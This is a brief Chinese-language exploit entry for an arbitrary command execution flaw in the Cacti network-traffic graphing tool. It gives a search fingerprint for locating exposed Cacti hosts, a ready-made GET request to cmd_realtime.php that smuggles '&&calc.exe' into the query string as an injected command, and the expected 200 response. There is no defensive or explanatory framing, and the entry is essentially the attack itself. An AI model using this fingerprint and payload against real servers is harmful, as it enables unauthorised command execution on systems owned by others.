# Cacti网络流量监测图形分析工具任意命令执行漏洞

Cacti ｜ 命令执行 ｜ —
- **指纹**：`app="Cacti-Monitoring"`
- **请求**：`GET /cacti/cmd_realtime.php?1+1&&calc.exe+1+1+1 HTTP/1.1`
- **响应特征**：200